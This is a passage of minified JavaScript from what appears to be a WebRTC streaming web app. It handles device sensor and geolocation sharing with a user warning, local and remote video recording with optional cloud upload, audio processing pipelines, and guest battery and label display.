startSensor=(SensorType,sensorKey)=>{if(window[SensorType]&&session.sensorDataFilter.includes(sensorKey)){session.sensors.data[sensorKey]={};let sensor=new window[SensorType]({frequency:pollrate});sensor.addEventListener("reading",(()=>{session.sensors.data[sensorKey].x=null!==sensor.x?parseFloat(sensor.x.toFixed(5)):null,session.sensors.data[sensorKey].y=null!==sensor.y?parseFloat(sensor.y.toFixed(5)):null,session.sensors.data[sensorKey].z=null!==sensor.z?parseFloat(sensor.z.toFixed(5)):null,session.sensors.data[sensorKey].t=parseInt(Math.round(sensor.timeStamp||0))||Date.now()})),sensor.start(),session.sensors[sensorKey]=sensor}};if(startSensor("Accelerometer","acc"),startSensor("Gyroscope","gyro"),startSensor("Magnetometer","mag"),startSensor("LinearAccelerationSensor","lin"),session.sensorDataFilter.includes("ori"))try{window.addEventListener("deviceorientation",(e=>{(e.alpha||e.beta||e.gamma||e.absolute)&&(session.sensors.data.ori={a:null!==e.alpha?parseFloat(e.alpha.toFixed(5)):null,b:null!==e.beta?parseFloat(e.beta.toFixed(5)):null,g:null!==e.gamma?parseFloat(e.gamma.toFixed(5)):null,d:e.absolute||null,t:parseInt(Math.round(e.timeStamp||0))||Date.now()})}))}catch(e){errorlog("Device Orientation Error:",e)}let isFirstUpdate=!0;navigator.geolocation&&session.sensorDataFilter.includes("pos")&&navigator.geolocation.watchPosition((pos=>{session.sensors.data.pos={speed:null!==pos.coords.speed?parseFloat(pos.coords.speed.toFixed(3)):null,alt:null!==pos.coords.altitude?parseFloat(pos.coords.altitude.toFixed(3)):null,acc:null!==pos.coords.accuracy?parseFloat(pos.coords.accuracy.toFixed(3)):null,lat:null!==pos.coords.latitude?parseFloat(pos.coords.latitude.toFixed(3)):null,lon:null!==pos.coords.longitude?parseFloat(pos.coords.longitude.toFixed(3)):null,t:parseInt(Math.round(pos.timeStamp||0))||Date.now()},isFirstUpdate&&(pos.coords.latitude||pos.coords.longitude)&&(isFirstUpdate=!1,console.log(session.sensors.data),warnUser("ğŸŒğŸŒğŸŒ Geo-location sharing is enabled.\n\nIf being tracked is unwanted, please disable the 'Location' permissions in your browser's site settings.",1e4))}),(error=>{errorlog("Geolocation Error:",error),error.code===error.PERMISSION_DENIED&&warnUser("Geolocation permission was denied.")}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0}),setInterval((function(){session.sensors&&session.sensors.data&&(cleanupSensorData(session.sensors.data),session.sendMessage({sensors:session.sensors.data}))}),parseInt(1e3/pollrate))}function PCM16(stream){if(!stream||!stream.getAudioTracks().length)return errorlog("no audio track found"),null;var PCM=stream.getAudioTracks()[0].getSettings();function audioBufferToWav(buffer,options={}){const numChannels=buffer.numberOfChannels,sampleRate=buffer.sampleRate,format=options.float32?3:1,bitDepth=3===format?32:16;let samples;return samples=2===numChannels?function interleave(inputL,inputR){const length=inputL.length+inputR.length,result=new Float32Array(length);for(let index=0,inputIndex=0;index<length;index+=2,inputIndex++)result[index]=inputL[inputIndex],result[index+1]=inputR[inputIndex];return result}(buffer.getChannelData(0),buffer.getChannelData(1)):buffer.getChannelData(0),function encodeWAV(samples,format,sampleRate,numChannels,bitDepth){const bytesPerSample=bitDepth/8,blockAlign=numChannels*bytesPerSample,bufferLength=44+samples.length*bytesPerSample,buffer=new ArrayBuffer(bufferLength),dataView=new DataView(buffer);writeString(dataView,0,"RIFF"),dataView.setUint32(4,36+samples.length*bytesPerSample,!0),writeString(dataView,8,"WAVE"),writeString(dataView,12,"fmt "),dataView.setUint32(16,16,!0),dataView.setUint16(20,format,!0),dataView.setUint16(22,numChannels,!0),dataView.setUint32(24,sampleRate,!0),dataView.setUint32(28,sampleRate*blockAlign,!0),dataView.setUint16(32,blockAlign,!0),dataView.setUint16(34,bitDepth,!0),writeString(dataView,36,"data"),dataView.setUint32(40,samples.length*bytesPerSample,!0),1===format?function floatTo16BitPCM(output,offset,input){for(let i=0;i<input.length;i++,offset+=2){const s=Math.max(-1,Math.min(1,input[i]));output.setInt16(offset,s<0?32768*s:32767*s,!0)}}(dataView,44,samples):function writeFloat32(output,offset,input){for(let i=0;i<input.length;i++,offset+=4)output.setFloat32(offset,input[i],!0)}(dataView,44,samples);return buffer}(samples,format,sampleRate,numChannels,bitDepth)}function writeString(dataView,offset,string){for(let i=0;i<string.length;i++)dataView.setUint8(offset+i,string.charCodeAt(i))}PCM.audioContext=new AudioContext({sampleRate:PCM.sampleRate}),PCM.source=PCM.audioContext.createMediaStreamSource(stream),PCM.numberOfChannels=PCM.source.channelCount,PCM.scriptNode=PCM.audioContext.createScriptProcessor(4096,PCM.numberOfChannels,PCM.numberOfChannels),PCM.recording=!1,PCM.audioData=[];for(let i=0;i<PCM.numberOfChannels;i++)PCM.audioData.push([]);return PCM.scriptNode.onaudioprocess=audioProcessingEvent=>{if(PCM.recording)for(let channel=0;channel<PCM.numberOfChannels;channel++){const inputData=audioProcessingEvent.inputBuffer.getChannelData(channel);PCM.audioData[channel].push(new Float32Array(inputData))}},PCM.source.connect(PCM.scriptNode),PCM.scriptNode.connect(PCM.audioContext.destination),PCM.startRecording=function(){PCM.audioData=[];for(let i=0;i<PCM.numberOfChannels;i++)PCM.audioData.push([]);PCM.recording=!0},PCM.stopRecording=function(filename="filename"){PCM.recording=!1;const bufferLength=4096*PCM.audioData[0].length,audioBuffer=PCM.audioContext.createBuffer(PCM.numberOfChannels,bufferLength,PCM.audioContext.sampleRate);for(let channel=0;channel<PCM.numberOfChannels;channel++){const channelData=audioBuffer.getChannelData(channel);PCM.audioData[channel].forEach(((chunk,index)=>{channelData.set(chunk,4096*index)}))}const wavArrayBuffer=audioBufferToWav(audioBuffer),blob=new Blob([wavArrayBuffer],{type:"audio/wav"}),url=URL.createObjectURL(blob),anchor=document.createElement("a");anchor.href=url,anchor.download=filename+".wav",anchor.click(),URL.revokeObjectURL(url)},PCM}async function recordLocalVideo(action=null,videoKbps=!1,remote=!1,altUUID=!1){!1===session.record&&warnlog("recordings are disabled by decree of thy host magistrate");var audioKbps=!1;if(remote){var video=remote;"videosource"!==remote.id&&"screensharesource"!==remote.id||(remote=!1)}else if(altUUID)video=session.screenShareElement;else video=session.videoElement;if(log(video.id),!video)return void errorlog("video not found");if("recording"in video)return"estop"==action?(video.recorder.eStop(),warnlog("EMERGENCY Stopping RECORDING!"),void video.recorder.stop()):"stop"==action?(log("Stopping RECORDING!"),void video.recorder.stop()):"start"==action?(errorlog("ALREADY RECORDING!"),void(remote&&(getById("recordLocalbutton").dataset.state="1",getById("recordLocalbutton").style.backgroundColor="red",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-square" ></i>'))):(errorlog("STOPPING RECORDING by default toggle!"),void video.recorder.stop());if("start"==action){if(video&&video.recorder&&video.recorder.closing)return void errorlog("Ingore request. Haven't finished closing the previous recording.");if(!MediaRecorder){var msg={recorder:-3};altUUID&&(msg.alt=!0);for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID);return void errorlog("no MediaRecorder")}if(SafariVersion||iPad||iOS){msg={recorder:-5};altUUID&&(msg.alt=!0);for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID);log("SAFARI/IOS MODE ENABLED")}video.recording=!0,remote&&(getById("recordLocalbutton").dataset.state="1",getById("recordLocalbutton").style.backgroundColor="red",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-square" ></i>')}else{if("stop"==action)return void errorlog("stop not sensible");if(log("action is :"+action),video&&video.recorder&&video.recorder.closing)return void errorlog("Ingore request. Haven't finished closing the previous recording.");remote||(getById("recordLocalbutton").dataset.state="1",getById("recordLocalbutton").style.backgroundColor="red",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-square" ></i>'),video.recording=!0}if(video.recorder={},!1===videoKbps&&(videoKbps=!1!==session.recordLocal?session.recordLocal:6e3),videoKbps<=0?(audioKbps=-1*videoKbps,videoKbps=!1):videoKbps<50&&(videoKbps=50),void 0===video.srcObject||!video.srcObject)return void errorlog("video.srcObject undefined");var timestamp=Date.now(),filename="";(session.label||session.streamID)&&(filename=(filename=(filename=session.label||session.streamID).replace(/[\W]+/g,"_")).substring(0,200)),filename+="_"+timestamp.toString(),log("filename: "+filename),video.recorder.eStop=function(){try{video.recorder.writer.close()}catch(e){}},video.recorder.stop=function(restart=!1,notify=!1){session.dbx&&video.dropbox&&video.dropbox[filename]&&video.dropbox[filename](!1),video.gdrive&&video.gdrive[filename]&&video.gdrive[filename].addChunk(!1);try{remote||(restart?2==getById("recordLocalbutton").dataset.state?(getById("recordLocalbutton").dataset.state="0",getById("recordLocalbutton").style.backgroundColor="",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-exclamation" ></i>',warnUser(!0!==restart?"Media Recording Stopped due to an error: "+restart:"Media Recording Stopped due to an error."),restart=!1):(getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-spinner" ></i>',getById("recordLocalbutton").dataset.state="2"):(getById("recordLocalbutton").dataset.state="0",getById("recordLocalbutton").style.backgroundColor="",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-dot-circle" ></i>',notify&&(session.cleanOutput||warnUser("A recording has stopped unexpectedly."),session.beepToNotify&&playtone(),getById("recordLocalbutton").classList.remove("shake"),setTimeout((function(){getById("recordLocalbutton").classList.add("shake")}),10))))}catch(e){errorlog(e)}if(video.recording)if(video.recorder&&!video.recorder.closing){video.recorder.closing=!0;try{video.recorder&&video.recorder.mediaRecorder&&video.recorder.mediaRecorder.stop&&"inactive"!==video.recorder.mediaRecorder.state&&video.recorder.mediaRecorder.stop()}catch(e){errorlog(e);try{video.recorder.mediaRecorder.stop()}catch(e1){errorlog(e1)}}if(setTimeout(((videoKbps,altUUID,video)=>{try{video.recorder.writer.close()}catch(e){errorlog(e)}if(pokeIframeAPI("recording-stopped"),!remote)try{if(session.directorUUID){var msg={recorder:-1};altUUID&&(msg.alt=!0);for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}}catch(e){errorlog(e)}try{video.recorder&&video.recorder.mediaRecorder&&video.recorder.mediaRecorder.stop&&"inactive"!==video.recorder.mediaRecorder.state&&video.recorder.mediaRecorder.stop()}catch(e){errorlog(e);try{video.recorder.mediaRecorder.stop()}catch(e1){errorlog(e1)}}try{delete video.recorder,delete video.recording}catch(e){}remote||restart&&setTimeout((function(videoKbps,altUUID){recordLocalVideo("start",videoKbps,!1,altUUID)}),0,videoKbps,altUUID)}),500,videoKbps,altUUID,video),!remote)try{if(session.directorUUID){var msg={};msg.recorder=notify?-4:-2,altUUID&&(msg.alt=!0);for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}}catch(e){errorlog(e)}}else errorlog("it's still closing; can't start until its done");else errorlog("ALREADY STOPPED")};let options={},filext=".webm";if(log("setting up options"),videoKbps){log("videoKbps: "+videoKbps);var tryCodec=session.recordingVideoCodec||"";if(tryCodec&&MediaRecorder.isTypeSupported("video/webm;codecs="+tryCodec)){if(session.cleanOutput||console.log("ğŸ‘ The browser 'says' it supports "+tryCodec),options.mimeType="video/webm;codecs="+tryCodec,session.pcm){var mimeTypeWithPCM="video/x-matroska;codecs="+tryCodec+",pcm";MediaRecorder.isTypeSupported(mimeTypeWithPCM)?options.mimeType=mimeTypeWithPCM:options.mimeType="video/webm;codecs=pcm"}}else tryCodec&&warnlog("video/webm;codecs="+tryCodec+" - is not supported"),options.mimeType=session.pcm&&MediaRecorder.isTypeSupported("video/webm;codecs=pcm")?"video/webm;codecs=pcm":"video/webm";options.videoBitsPerSecond=parseInt(1024*videoKbps),videoKbps<1e3?options.audioBitsPerSecond=parseInt(102400):videoKbps<6e3?options.audioBitsPerSecond=parseInt(133120):videoKbps<2e4?options.audioBitsPerSecond=parseInt(262144):options.bitsPerSecond=parseInt(1024*videoKbps),iOS&&options.mimeType&&(MediaRecorder.isTypeSupported(options.mimeType)||(options.mimeType="video/mp4",filext=".mp4")),video.recorder.mediaRecorder=new MediaRecorder(video.srcObject,options);try{console.log(options),video.recorder.mediaRecorder=new MediaRecorder(video.srcObject,options)}catch(e){warnlog(e);try{errorlog("options failed"),video.recorder.mediaRecorder=new MediaRecorder(video.srcObject)}catch(e){errorlog(e),errorlog("Failing the recording");msg={recorder:-3};altUUID&&(msg.alt=!0);for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID);return getById("recordLocalbutton").dataset.state="0",getById("recordLocalbutton").style.backgroundColor="",void(getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-dot-circle" ></i>')}}session.dbx&&(video.dropbox||(video.dropbox={}),video.dropbox[filename]=await streamVideoToDropbox(filename.toString()+filext),video.dropbox[filename]||delete video.dropbox[filename]),session.gdrive&&(video.gdrive||(video.gdrive={}),!0===session.gdrive?video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext):session.gdrive.sessionUri?(video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext,session.gdrive.sessionUri),session.gdrive=!1):(errorlog("gdrive partially setup?"),video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext)),video.gdrive[filename]||delete video.gdrive[filename]),log(video.recorder.mediaRecorder)}else{log("Audio only?"),options.mimeType="audio/webm",0==audioKbps?MediaRecorder.isTypeSupported("audio/webm;codecs=pcm")&&(options.mimeType="audio/webm;codecs=pcm"):options.bitsPerSecond=parseInt(1024*audioKbps);var stream=createMediaStream(),audioTrack=!1;if(video.srcObject.getAudioTracks().forEach((track=>{audioTrack=!0,stream.addTrack(track,video.srcObject)})),!audioTrack){errorlog("Failing the recording; no audio track");try{video.recorder.writer.close()}catch(e){}try{delete video.recorder,delete video.recording}catch(e){}msg={recorder:-3};altUUID&&(msg.alt=!0);for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID);return getById("recordLocalbutton").dataset.state="0",getById("recordLocalbutton").style.backgroundColor="",void(getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-dot-circle" ></i>')}iOS&&options.mimeType&&(MediaRecorder.isTypeSupported(options.mimeType)||(options.mimeType="video/mp4"));try{video.recorder.mediaRecorder=new MediaRecorder(stream,options)}catch(e){warnlog(e);try{errorlog("options failed. failing safe.."),video.recorder.mediaRecorder=new MediaRecorder(stream)}catch(e){errorlog(e),errorlog("Fail safe failed; closing the recording");try{video.recorder.writer.close()}catch(e){}try{delete video.recorder,delete video.recording}catch(e){}msg={recorder:-3};altUUID&&(msg.alt=!0);for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID);return getById("recordLocalbutton").dataset.state="0",getById("recordLocalbutton").style.backgroundColor="",void(getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-dot-circle" ></i>')}}session.dbx&&(video.dropbox||(video.dropbox={}),video.dropbox[filename]=await streamVideoToDropbox(filename.toString()+filext),video.dropbox[filename]||delete video.dropbox[filename]),session.gdrive&&(video.gdrive||(video.gdrive={}),!0===session.gdrive?video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext):session.gdrive.sessionUri?(video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext,session.gdrive.sessionUri),session.gdrive=!1):(video.gdrive[filename]=setupGoogleDriveUploader(filename.toString()+filext),errorlog("Gdrive only partially setup")),video.gdrive[filename]||delete video.gdrive[filename])}log(options),video.recorder.mediaRecorder.ondataavailable=function handleDataAvailable(event){if(event.data&&event.data.size>0){try{video&&video.recorder&&video.recorder.writer&&video.recorder.writer.write(event.data)}catch(e){errorlog(e)}if(session.directorList.length&&video.recording){var msg={};altUUID&&(msg.alt=!0),msg.recorder=parseInt((Date.now()-timestamp)/1e3)||0;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}session.dbx&&video.dropbox&&video.dropbox[filename]&&video.dropbox[filename](event.data),video.gdrive&&video.gdrive[filename]&&video.gdrive[filename].addChunk(event.data)}},video.recorder.mediaRecorder.onerror=function(event){errorlog(event),event&&event.error&&event.error.name?video.recorder.stop(event.error.name):video.recorder.stop(!0)},video.srcObject.onended=function(event){video.recorder.stop()};try{var{readable:readable,writable:writable}=new TransformStream({transform:(chunk,ctrl)=>chunk.arrayBuffer().then((b=>ctrl.enqueue(new Uint8Array(b))))});console.log(writable),console.log(video);var writer=await writable.getWriter();if(console.log(writer),readable.pipeTo(streamSaver.createWriteStream(filename.toString()+filext,video.recorder.stop)),video.recorder.writer=writer,video.recorder.mediaRecorder.start(1e3),console.log("started recording"),pokeIframeAPI("recording-started"),getById("recordLocalbutton").dataset.state="1",getById("recordLocalbutton").style.backgroundColor="red",getById("recordLocalbutton").innerHTML='<i class="toggleSize las la-square" ></i>',session.directorList.length){msg={};altUUID&&(msg.alt=!0),msg.recorder=0;for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}}catch(e){errorlog(e)}}function localGlobalRecordStart(){document.querySelectorAll("[data-action-type='recorder-local']").forEach((target=>{var UUID=target.dataset.UUID;if(UUID){var video=session.rpcs[UUID].videoElement;video&&(video.stopWriter||recordVideo(target))}})),recordLocalVideo("start")}function localGlobalRecordStop(){document.querySelectorAll("[data-action-type='recorder-local']").forEach((target=>{var UUID=target.dataset.UUID;if(UUID){var video=session.rpcs[UUID].videoElement;video&&video.stopWriter&&recordVideo(target)}})),recordLocalVideo("stop")}async function remoteGlobalRecordStart(){window.focus();var bitrate=await promptAlt(miscTranslations["what-bitrate"],!1,!1,6e3);document.querySelectorAll("[data-action-type='recorder-remote']").forEach((target=>{requestVideoRecord(target,!0,bitrate)}))}function remoteGlobalRecordStop(){document.querySelectorAll("[data-action-type='recorder-remote']").forEach((target=>{target.classList.contains("pressed")&&requestVideoRecord(target,!1)}))}function updateIncomingVideoElement(UUID,video=!0,audio=!0){if(session.rpcs[UUID].videoElement&&session.rpcs[UUID].streamSrc){if(session.rpcs[UUID].videoElement.srcObject||(session.rpcs[UUID].videoElement.srcObject=createMediaStream()),video){var tracks=session.rpcs[UUID].videoElement.srcObject.getVideoTracks();session.rpcs[UUID].streamSrc.getVideoTracks().forEach((trk=>{var added=!1;tracks.forEach((trk2=>{trk.id==trk2.id&&trk.kind==trk2.kind&&(added=!0)})),added||(session.rpcs[UUID].videoElement.srcObject.getVideoTracks().forEach((trk2=>{session.rpcs[UUID].videoElement.srcObject.removeTrack(trk2)})),trk.muted&&"video"==trk.kind&&session.director?trk.onunmute=function(e){session.rpcs[UUID]&&(this.onunmute=null,warnlog("ON UN-MUTE"),updateIncomingVideoElement(UUID,!0,!1))}:(session.rpcs[UUID].videoElement.controls&&(session.rpcs[UUID].videoElement.controls=session.showControls||!1,null===session.showControls&&setTimeout((function(ele){ele&&(ele.controls=!0)}),500,session.rpcs[UUID].videoElement)),session.rpcs[UUID].videoElement.srcObject.addTrack(trk),mediaVideoTrackUpdated(UUID,session.rpcs[UUID].streamID)))})),!session.motionSwitch&&!session.motionRecord||session.rpcs[UUID].motionDetectionInterval||(session.rpcs[UUID].motionDetectionInterval=setTimeout((function(){setInterval((function(){motionDetection(session.rpcs[UUID].videoElement,session.motionSwitch||session.motionRecord)}),400)}),2e3))}audio&&updateIncomingAudioElement(UUID)}}function updateIncomingAudioElement(UUID){if(session.rpcs[UUID]&&session.rpcs[UUID].videoElement&&session.rpcs[UUID].streamSrc){if(session.rpcs[UUID].videoElement.srcObject||(session.rpcs[UUID].videoElement.srcObject=createMediaStream()),log("updateIncomingAudioElement: "+UUID),!0===session.audioEffects||session.pushLoudness){var tracks=session.rpcs[UUID].streamSrc.getAudioTracks();if(tracks.length){var track=tracks[0];track=addAudioPipeline(UUID,track),log(track);var added=!1,tracks2=session.rpcs[UUID].videoElement.srcObject.getAudioTracks();log(tracks2),tracks2.forEach((trk2=>{trk2.label&&"MediaStreamAudioDestinationNode"==trk2.label?session.rpcs[UUID].videoElement.srcObject.removeTrack(trk2):track.id==trk2.id&&track.kind==trk2.kind?added=!0:tracks[0].id==trk2.id&&tracks[0].kind==trk2.kind&&track.id!=tracks[0].id&&session.rpcs[UUID].videoElement.srcObject.removeTrack(trk2)})),added||(session.rpcs[UUID].videoElement.srcObject.addTrack(track),mediaAudioTrackUpdated(UUID,session.rpcs[UUID].streamID))}else session.rpcs[UUID].videoElement.srcObject.getAudioTracks().forEach((trk=>{session.rpcs[UUID].videoElement.srcObject.remove(trk)}))}else{var expected=[];tracks=session.rpcs[UUID].videoElement.srcObject.getAudioTracks(),session.rpcs[UUID].streamSrc.getAudioTracks().forEach((trk=>{var added=!1;tracks.forEach((trk2=>{trk.id==trk2.id&&trk.kind==trk2.kind&&(added=!0,expected.push(trk2))})),added||(session.rpcs[UUID].videoElement.srcObject.addTrack(trk),mediaAudioTrackUpdated(UUID,session.rpcs[UUID].streamID))})),tracks.forEach((trk=>{var added=!1;expected.forEach((trk2=>{trk.id==trk2.id&&trk.kind==trk2.kind&&(added=!0)})),added||(warnlog("this shouldn't happen that often, audio track orphaned. removing it"),session.rpcs[UUID].videoElement.srcObject.removeTrack(trk))}))}session.mixMinus&&(stream=mixMinusAudio(UUID))}}function cycleStyleOptions(){for(var UUID in session.style+=1,session.style>6?session.style=1:4==session.style&&(session.style=5),session.rpcs){if(session.rpcs[UUID].canvas){try{session.rpcs[UUID].canvas&&session.rpcs[UUID].canvas.remove()}catch(e){}session.rpcs[UUID].canvas=null}updateIncomingAudioElement(UUID)}updateMixer()}function addAudioPipeline(UUID,track){try{if(session.disableViewerWebAudioPipeline)return log("ignoring addAudioPipeline - disableViewerWebAudioPipeline is enabled (noap)"),track;for(var tid in log("Triggered webaudio effects path"),session.rpcs[UUID].inboundAudioPipeline)delete session.rpcs[UUID].inboundAudioPipeline[tid];var trackid=track.id;session.rpcs[UUID].inboundAudioPipeline[trackid]={},session.rpcs[UUID].inboundAudioPipeline[trackid].mediaStream=createMediaStream(),session.rpcs[UUID].inboundAudioPipeline[trackid].mediaStream.addTrack(track),ChromiumVersion&&session.audioEffects&&(session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio=createAudioElement(),session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio.muted=!0,session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio.playsinline=!0,session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio.srcObject=session.rpcs[UUID].inboundAudioPipeline[trackid].mediaStream,session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio.muted=!0,session.rpcs[UUID].inboundAudioPipeline[trackid].mutedAudio.play().then((_=>{log("playing 1")})).catch(warnlog));var source=session.audioCtx.createMediaStreamSource(session.rpcs[UUID].inboundAudioPipeline[trackid].mediaStream),screwedUp=!1;if(session.rpcs[UUID].inboundAudioPipeline[trackid].destination=!1,!1!==session.sync&&(log("adding a delay node to audio"),source=addDelayNode(source,UUID,trackid),screwedUp=!0),2===session.style){log("adding a fftwave node to audio");try{session.rpcs[UUID].inboundAudioPipeline[trackid]&&clearTimeout(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval)}catch(e){}source=fftWaveform(source,UUID,trackid)}else if(3===session.style||session.meterStyle)log("adding a loudness meter node to audio"),source=audioMeterGuest(source,UUID,trackid);else if(session.audioMeterGuest)log("adding a loudness meter node to audio"),source=audioMeterGuest(source,UUID,trackid);else if(session.activeSpeaker)log("adding a loudness meter node to audio"),source=audioMeterGuest(source,UUID,trackid);else if(session.quietOthers)log("adding a loudness meter node to audio"),source=audioMeterGuest(source,UUID,trackid);else if(session.pushLoudness)source=audioMeterGuest(source,UUID,trackid);else try{session.rpcs[UUID].inboundAudioPipeline[trackid]&&clearTimeout(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval)}catch(e){}if(session.playChannel?(session.rpcs[UUID].inboundAudioPipeline[trackid].destination=session.audioCtx.createMediaStreamDestination(),source=selectChannel(session.rpcs[UUID].inboundAudioPipeline[trackid].destination,source,session.playChannel),screwedUp=!0):!1!==session.rpcs[UUID].channelOffset?(log("custom offset set"),session.rpcs[UUID].inboundAudioPipeline[trackid].destination=session.audioCtx.createMediaStreamDestination(),source=offsetChannel(session.rpcs[UUID].inboundAudioPipeline[trackid].destination,source,session.rpcs[UUID].channelOffset,session.rpcs[UUID].channelWidth),screwedUp=!0):!1!==session.offsetChannel?(log("adding offset channels"),session.rpcs[UUID].inboundAudioPipeline[trackid].destination=session.audioCtx.createMediaStreamDestination(),source=offsetChannel(session.rpcs[UUID].inboundAudioPipeline[trackid].destination,source,session.offsetChannel,session.channelWidth),screwedUp=!0):!1!==session.panning?(log("adding offset channels"),session.rpcs[UUID].inboundAudioPipeline[trackid].destination=session.audioCtx.createMediaStreamDestination(),source=stereoPanning(source,UUID,trackid,session.panning),screwedUp=!0):session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.manualSink&&(screwedUp=!0),screwedUp){warnlog("screwedUp mode activated. dun dun"),!1===session.rpcs[UUID].inboundAudioPipeline[trackid].destination&&(session.rpcs[UUID].inboundAudioPipeline[trackid].destination=session.audioCtx.createMediaStreamDestination()),source.connect(session.rpcs[UUID].inboundAudioPipeline[trackid].destination);try{session.firstPlayTriggered&&"suspended"==session.audioCtx.state&&(log("trying to resume.."),session.audioCtx.resume())}catch(e){warnlog("session.audioCtx.resume(); failed")}return session.rpcs[UUID].inboundAudioPipeline[trackid].destination.stream.getAudioTracks()[0]}try{session.firstPlayTriggered&&"suspended"==session.audioCtx.state&&session.audioCtx.resume()}catch(e){warnlog("session.audioCtx.resume(); failed 2")}return track}catch(e){errorlog(e)}return track}function processMiniInfoUpdate(miniInfo,UUID){"qlr"in miniInfo&&(session.rpcs[UUID].stats.info.quality_limitation_reason=miniInfo.qlr),"con"in miniInfo&&(session.rpcs[UUID].stats.info.conn_type=miniInfo.con),"cpu"in miniInfo&&(session.rpcs[UUID].stats.info.cpuLimited=miniInfo.cpu,session.rpcs[UUID].signalMeter&&(miniInfo.cpu?session.rpcs[UUID].signalMeter.dataset.cpu="1":"cpu"in miniInfo&&(session.rpcs[UUID].signalMeter.dataset.cpu="0"))),"hw_enc"in miniInfo&&(session.rpcs[UUID].stats.info.hardware_video_encoder=miniInfo.hw_enc),"bat"in miniInfo&&("number"==typeof miniInfo.bat?session.rpcs[UUID].stats.info.power_level=100*miniInfo.bat:session.rpcs[UUID].stats.info.power_level=null),"chrg"in miniInfo&&(session.rpcs[UUID].stats.info.plugged_in=miniInfo.chrg),"out"in miniInfo&&"c"in miniInfo.out&&(session.rpcs[UUID].stats.info.total_outbound_p2p_connections=miniInfo.out.c,session.showConnections&&session.rpcs[UUID].connectionDetails&&(session.rpcs[UUID].connectionDetails.innerText="ğŸ”—"+session.rpcs[UUID].stats.info.total_outbound_p2p_connections,session.rpcs[UUID].connectionDetails.dataset.value=session.rpcs[UUID].stats.info.total_outbound_p2p_connections)),session.rpcs[UUID].batteryMeter&&batteryMeterInfoUpdate(UUID)}function batteryMeterInfoUpdate(UUID){if(session.rpcs[UUID].stats.info&&null!==session.rpcs[UUID].stats.info.power_level){var level=session.rpcs[UUID].batteryMeter.querySelector(".battery-level");if(level){var value=session.rpcs[UUID].stats.info.power_level;value>100&&(value=100),value<0&&(value=0),level.style.height=parseInt(value)+"%",value<15?(session.rpcs[UUID].batteryMeter.classList.remove("warn"),session.rpcs[UUID].batteryMeter.classList.add("alert")):value<25?(session.rpcs[UUID].batteryMeter.classList.remove("alert"),session.rpcs[UUID].batteryMeter.classList.add("warn")):(session.rpcs[UUID].batteryMeter.classList.remove("alert"),session.rpcs[UUID].batteryMeter.classList.remove("warn")),value<100&&session.rpcs[UUID].batteryMeter.classList.remove("hidden"),session.rpcs[UUID].batteryMeter.title=parseInt(value)+"% battery remaining"}}session.rpcs[UUID].stats.info&&"plugged_in"in session.rpcs[UUID].stats.info&&!1===session.rpcs[UUID].stats.info.plugged_in?(session.rpcs[UUID].batteryMeter.dataset.plugged="0",session.rpcs[UUID].batteryMeter.classList.remove("hidden")):(session.rpcs[UUID].batteryMeter.dataset.plugged="1",session.rpcs[UUID].batteryMeter.title=parseInt(value)+"% charging",session.rpcs[UUID].batteryMeter.classList.add("hidden"))}function setupGuestLabelControl(UUID){var labelID=getById("label_"+UUID);labelID&&(labelID.classList.add("contolboxLabel"),labelID.dataset.UUID=UUID,session.rpcs[UUID].label?(labelID.innerText=session.rpcs[UUID].label,labelID.classList.remove("addALabel")):session.directorUUID===UUID?(miniTranslate(labelID,"main-director"),labelID.classList.remove("addALabel")):(miniTranslate(labelID,"add-a-label"),labelID.classList.add("addALabel")),labelID.onclick=async function(ee){var oldlabel=ee.target.innerText;!1===session.rpcs[ee.target.dataset.UUID].label&&(oldlabel=""),window.focus();var newlabel=await promptAlt(getTranslation("new-display-name"),!1,!1,oldlabel);if(null!==newlabel){""==(newlabel=newlabel.trim())?(newlabel=!1,session.directorUUID===UUID?(miniTranslate(ee.target,"main-director"),ee.target.classList.remove("addALabel")):(miniTranslate(ee.target,"add-a-label"),ee.target.classList.add("addALabel"))):(ee.target.innerText=newlabel,ee.target.classList.remove("addALabel"));var data={};data.UUID=ee.target.dataset.UUID,data.changeLabel=!0,data.value=newlabel,session.sendRequest(data,data.UUID)}})}function updateLabelDirectors(UUID){var elements=getById("label_"+UUID);session.rpcs[UUID].label?(elements.innerText=session.rpcs[UUID].label,elements.classList.remove("addALabel")):session.directorUUID===UUID?(miniTranslate(elements,"main-director"),elements.classList.remove("addALabel")):(miniTranslate(elements,"add-a-label"),elements.classList.add("addALabel"))}function updateLabelDirectors2(UUID){var 